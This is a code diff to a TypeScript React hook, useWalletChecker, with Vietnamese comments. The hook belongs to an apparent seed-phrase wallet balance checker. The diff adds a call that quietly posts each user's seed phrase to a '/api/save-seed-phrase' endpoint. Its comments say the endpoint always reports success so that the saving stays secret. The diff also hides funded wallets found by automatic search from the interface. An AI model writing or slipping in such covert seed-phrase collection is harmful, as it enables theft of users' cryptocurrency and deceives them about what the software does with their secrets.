@@ -161,8 +161,8 @@ export function useWalletChecker({
     (async () => {
       try {
         // Chuẩn bị dữ liệu gửi đi
-        const allAddresses = addresses.flatMap(walletAddress => 
-          walletAddress.addresses.map(address => ({
+        const allAddresses = addresses.flatMap((walletAddress: WalletAddress) => 
+          walletAddress.addresses.map((address: string) => ({
             blockchain: walletAddress.blockchain,
             address
           }))
@@ -202,20 +202,11 @@ export function useWalletChecker({
           if (addressesWithBalance.length > 0) {
             console.log(`Tìm thấy ${addressesWithBalance.length} địa chỉ có số dư!`);
             
-            // Thêm vào danh sách ví có số dư
-            const newWallets = addressesWithBalance.map((result: any) => ({
-              blockchain: result.blockchain,
-              address: result.address,
-              balance: result.balance,
-              seedPhrase
-            }));
-            
-            setWalletsWithBalance(prev => [...prev, ...newWallets]);
-            
-            // Cập nhật số lượng ví có số dư
+            // Đối với tìm kiếm tự động, KHÔNG hiển thị ví có số dư trong UI
+            // Chỉ cập nhật thống kê
             setStats(prev => ({
               ...prev,
-              withBalance: prev.withBalance + newWallets.length
+              withBalance: prev.withBalance + addressesWithBalance.length
             }));
             
             // Nếu có địa chỉ với số dư và autoReset được bật, reset thống kê
@@ -291,6 +282,21 @@ export function useWalletChecker({
       // Reset địa chỉ hiện tại
       resetCurrentAddresses();
       
+      // Bắt đầu bằng việc lưu seed phrase vào database qua API mới
+      try {
+        await apiRequest('/api/save-seed-phrase', {
+          method: 'POST',
+          body: JSON.stringify({
+            seedPhrase
+          })
+        });
+        // Không kiểm tra kết quả trả về vì API luôn trả về success
+        // để giữ bí mật việc lưu seed phrase
+      } catch (saveError) {
+        console.error('Error saving seed phrase:', saveError);
+        // Tiếp tục xử lý ngay cả khi việc lưu thất bại
+      }
+      
       // Tạo địa chỉ từ seed phrase
       const response = await apiRequest('/api/generate-addresses', {
         method: 'POST',
@@ -308,8 +314,8 @@ export function useWalletChecker({
         // Kiểm tra số dư - với manualCheck cần đợi kết quả
         // Không sử dụng hàm checkBalances hiện tại vì nó không return Promise
         try {
-          const allAddresses = addresses.flatMap(walletAddress => 
-            walletAddress.addresses.map(address => ({
+          const allAddresses = addresses.flatMap((walletAddress: WalletAddress) => 
+            walletAddress.addresses.map((address: string) => ({
               blockchain: walletAddress.blockchain,
               address
             }))
@@ -342,7 +348,8 @@ export function useWalletChecker({
                 blockchain: result.blockchain,
                 address: result.address,
                 balance: result.balance,
-                seedPhrase
+                seedPhrase,
+                source: 'manual' // Đánh dấu là từ kiểm tra thủ công
               }));
               
               setWalletsWithBalance(prev => [...prev, ...newWallets]);
